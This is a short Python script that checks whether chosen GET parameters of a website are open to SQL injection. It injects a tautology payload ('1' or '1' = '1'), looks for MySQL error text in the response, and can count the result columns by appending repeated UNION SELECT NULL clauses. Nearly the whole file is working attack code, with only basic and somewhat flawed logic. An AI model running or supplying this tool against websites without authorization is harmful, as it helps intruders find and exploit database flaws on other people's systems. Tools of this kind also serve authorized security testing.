import sys
import urllib
import urllib.request
import re

# this script will check if GET parameters are injectables
#
# py sqli_checker.py [website URI] [parameter to inject...] [option...]
#
# OPTIONS :
# --count-columns : count the number of columns got by the query
#

""" Replace the attributes that are in to_inject by SQL
"""
def inject_SQL(uri, to_inject):
	first_part, second_part = uri.split('?')
	params = second_part.split('&')
	for i in range(len(params)):
		label, value = params[i].split('=')
		if label in to_inject:
			params[i] = label + "=1'%20or%20'1'%20=%20'1"

	return first_part + '?' + '&'.join(params)

def make_get_request(uri):
	# make the request
	resp = urllib.request.urlopen(uri)
	# parse response
	body = resp.read()

	return body.decode('utf-8')


regex_script_param = re.compile(r'^(-{2}[a-z]{2,})|(-{2}[a-z]+\-[a-z]+)|(-[a-z])$')

# required script name and URI at least
if len(sys.argv) < 2:
	sys.exit("[ERROR] You have to pass the URI to test as a parameter !")

# read the uri to test
uri = sys.argv[1]

# read the parameters and options
parameters = []
options = []
for i in range(2, len(sys.argv)):
	arg = sys.argv[i]
	if re.match(regex_script_param, arg):
		options.append(arg)
	else:
		parameters.append(arg)

full_body = make_get_request(inject_SQL(uri, parameters))

# check vulnerability by looking at the response
if "You have an error in your SQL syntax" in full_body:
	print ("Vulnerable to SQL injection !!")
	print ("MYSQL database")

	if '--count-columns' in options:
		count = 1
		temp_uri = uri + "%20UNION%20SELECT%20NULL"

		while "different number of columns" in make_get_request(temp_uri):
			count += 1
			temp_uri += ",NULL"

		print ("Number of columns : %d" % count)

else:
	print ("Not vulnerable to SQL injection.")
